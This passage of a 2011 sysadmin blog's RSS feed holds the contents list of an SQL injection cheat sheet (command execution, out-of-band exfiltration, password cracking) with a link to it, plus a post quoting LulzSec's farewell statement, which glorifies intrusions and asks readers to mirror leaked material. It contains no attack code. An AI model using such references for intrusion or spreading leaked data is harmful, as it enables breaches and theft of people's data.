+Find Column From Table Name<br />
+Avoiding the use of single/double quotations<br />
+String concatenation<br />
+Privileges<br />
+FILE privilege<br />
+MySQL 4/5<br />
+MySQL 5<br />
+Out Of Band Channeling<br />
+Timing<br />
+DNS (requires FILE privilege)<br />
+SMB (requires FILE privilege)<br />
+Reading Files (requires FILE privilege)<br />
+Writing Files (requires FILE privilege)<br />
+Stacked Queries with PDO<br />
+User Defined Functions<br />
+Fuzzing and Obfuscation<br />
+Allowed Intermediary Characters<br />
+Allowed Intermediary Characters after AND/OR<br />
+Operators<br />
+Constants<br />
+MySQL Functions()<br />
+MySQL Password Hashing<br />
+MySQL Password() Cracker</p>
+<p><strong>MSSQL</strong><br />
+Default Databases<br />
+Comment Out Query<br />
+Testing Version<br />
+Database Credentials<br />
+Database Server Hostname<br />
+Database Names<br />
+Tables &amp; Columns<br />
+Retrieving Tables<br />
+Retrieving Columns<br />
+Retrieving Multiple Tables/Columns at once<br />
+OPENROWSET Attacks<br />
+System Command Execution<br />
+SP_PASSWORD (Hiding Query)<br />
+Stacked Queries<br />
+Fuzzing and Obfuscation<br />
+Encodings<br />
+Allowed Intermediary Characters<br />
+Allowed Intermediary Characters after AND/OR<br />
+MSSQL Password Hashing<br />
+MSSQL Password Cracker</p>
+<p><strong>ORACLE</strong><br />
+Default Databases<br />
+Comment Out Query<br />
+Testing Version<br />
+Database Credentials<br />
+Database Names<br />
+Current Database<br />
+User Databases<br />
+Tables &amp; Columns<br />
+Retrieving Tables<br />
+Retrieving Columns<br />
+Finding Tables from Column Name<br />
+Finding Column From Table Name<br />
+Fuzzing and Obfuscation<br />
+Avoiding the use of single/double quotations<br />
+Out Of Band Channeling<br />
+Time Delay<br />
+Heavy Query Time delays</p>
+<p>You can find it here: <a href="https://docs.google.com/Doc?docid=0AZNlBave77hiZGNjanptbV84Z25yaHJmMjk&amp;pli=1#Allowed_Intermediary_Character_30801873723976314">SQL Injection Pocket Reference</a></p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/datamgmt/datadesign/sql-injection-pocket-reference-for/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+		</item>
+		<item>
+		<title>LulzSec has shut down, has ended hacking campaign</title>
+		<link>/index.php/sysadmins/os/windows/2003server/lulzsec-has-shut-down-has/</link>
+		<comments>/index.php/sysadmins/os/windows/2003server/lulzsec-has-shut-down-has/#comments</comments>
+		<pubDate>Sun, 26 Jun 2011 09:59:00 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[2003 Server]]></category>
+		<category><![CDATA[hackers]]></category>
+		<category><![CDATA[lulzsec]]></category>
+		<category><![CDATA[security]]></category>
+
+		<guid isPermaLink="false">/index.php/2011/06/lulzsec-has-shut-down-has/</guid>
+		<description><![CDATA[LulzSec  has just announced that it is shutting down. LulzSec, so far has hacked the CIA, U.S. Senate, Nintendo, Sony and others, has surprisingly announced that it is disbanding.
+
+. /$$                 /$$            /$$$$$$                    
+.&#124; $&#8230;]]></description>
+				<content:encoded><![CDATA[<p>LulzSec  has just announced that it is shutting down. LulzSec, so far has hacked the CIA, U.S. Senate, Nintendo, Sony, AT&amp;T, AOL, Disney, Universal, EMI, the FBI and others</p>
+<pre>. /$$                 /$$            /$$$$$$                    
+.| $$                | $$           /$$__  $$                    
+.| $$       /$$   /$$| $$ /$$$$$$$$| $$  __/  /$$$$$$   /$$$$$$$
+.| $$      | $$  | $$| $$|____ /$$/|  $$$$$$  /$$__  $$ /$$_____/
+.| $$      | $$  | $$| $$   /$$$$/  ____  $$| $$$$$$$$| $$      
+.| $$      | $$  | $$| $$  /$$__/   /$$   $$| $$_____/| $$      
+.| $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$.$
+.|________/ ______/ |__/|________/ ______/  _______/ _______/
+                          //Laughing at your security since 2011!
+
+.--    .-""-.
+.   ) (     )
+.  (   )   (
+.     /     )
+.    (_    _)                     0_,-.__
+.      (_  )_                     |_.-._/
+.       (    )                    |lulz..    
+.        (__)                     |__--_/          
+.     |''   ``                   |
+.     | [Lulz]                   |      /b/
+.     |           ,,,---===?A`  |  ,==y'
+.   ___,,,,,---==""        |M]  | ;| |&gt;
+.           _   _      ___,|H,,---==""""bno,
+.    o  O  (_) (_)    /          _     AWAW/
+.                     /         _(+)_  dMM/
+.      @_,,,,,,---=="         \|//  MW/
+.--''''"                         ===  d/
+.                                    //   SET SAIL FOR FAIL!
+.                                    ,'_________________________
+.                               ,/~~~~~~~~~~~~~~~~~~~~~~~~~~~
+.                         _____    ,'  ~~~   .-""-.~~~~~~  .-""-.
+.      .-""-.           ///==---   /`-._ ..-'      -.__..-'
+.            `-.__..-' =====\\\ V/  .---.
+.                     ~~~~~~~~~~~~, _',--/_.  .-""-.
+.                            .-""-.___` --  |         -.__..-</pre>
+<p>Here is the &#8220;press release&#8221;</p>
+<blockquote><p>Friends around the globe,</p>
+<p>We are Lulz Security, and this is our final release, as today marks something meaningful to us. 50 days ago, we set sail with our humble ship on an uneasy and brutal ocean: the Internet. The hate machine, the love machine, the machine powered by many machines. We are all part of it, helping it grow, and helping it grow on us.</p>
+<p>For the past 50 days we&#8217;ve been disrupting and exposing corporations, governments, often the general population itself, and quite possibly everything in between, just because we could. All to selflessly entertain others &#8211; vanity, fame, recognition, all of these things are shadowed by our desire for that which we all love. The raw, uninterrupted, chaotic thrill of entertainment and anarchy. It&#8217;s what we all crave, even the seemingly lifeless politicians and emotionless, middle-aged self-titled failures. You are not failures. You have not blown away. You can get what you want and you are worth having it, believe in yourself.</p>
+<p>While we are responsible for everything that The Lulz Boat is, we are not tied to this identity permanently. Behind this jolly visage of rainbows and top hats, we are people. People with a preference for music, a preference for food; we have varying taste in clothes and television, we are just like you. Even Hitler and Osama Bin Laden had these unique variations and style, and isn&#8217;t that interesting to know? The mediocre painter turned supervillain liked cats more than we did.</p>
+<p>Again, behind the mask, behind the insanity and mayhem, we truly believe in the AntiSec movement. We believe in it so strongly that we brought it back, much to the dismay of those looking for more anarchic lulz. We hope, wish, even beg, that the movement manifests itself into a revolution that can continue on without us. The support we&#8217;ve gathered for it in such a short space of time is truly overwhelming, and not to mention humbling. Please don&#8217;t stop. Together, united, we can stomp down our common oppressors and imbue ourselves with the power and freedom we deserve.</p>
+<p>So with those last thoughts, it&#8217;s time to say bon voyage. Our planned 50 day cruise has expired, and we must now sail into the distance, leaving behind &#8211; we hope &#8211; inspiration, fear, denial, happiness, approval, disapproval, mockery, embarrassment, thoughtfulness, jealousy, hate, even love. If anything, we hope we had a microscopic impact on someone, somewhere. Anywhere.</p>
+<p>Thank you for sailing with us. The breeze is fresh and the sun is setting, so now we head for the horizon.</p>
+<p>Let it flow&#8230;</p>
+<p>Lulz Security &#8211; our crew of six wishes you a happy 2011, and a shout-out to all of our battlefleet members and supporters across the globe</p>
+<p>&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;</p>
+<p>Our mayhem: http://lulzsecurity.com/releases/<br />
+Our chaos: http://thepiratebay.org/user/LulzSec/<br />
+Our final release: http://thepiratebay.org/torrent/6495523/50_Days_of_Lulz</p>
+<p>Please make mirrors of material on the website, because we&#8217;re not renewing the hosting. Goodbye. &lt;3</p></blockquote>
+<p>I think that this has caused enough problems so that in the future we won&#8217;t see companies storing passwords unencrypted in clear text. Overall I think this was probably needed to show what state the industry was in, every day I woke up, I wondered who was hacked today. </p>
+<p>Hopefully all the companies that were not hacked got a wake up call and they are investigating their security of their systems and making the necessary changes to harden their systems. And never, I mean never store customer data in plain text, this will bite you back sooner or later.</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/sysadmins/os/windows/2003server/lulzsec-has-shut-down-has/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+		</item>
+	</channel>
+</rss>
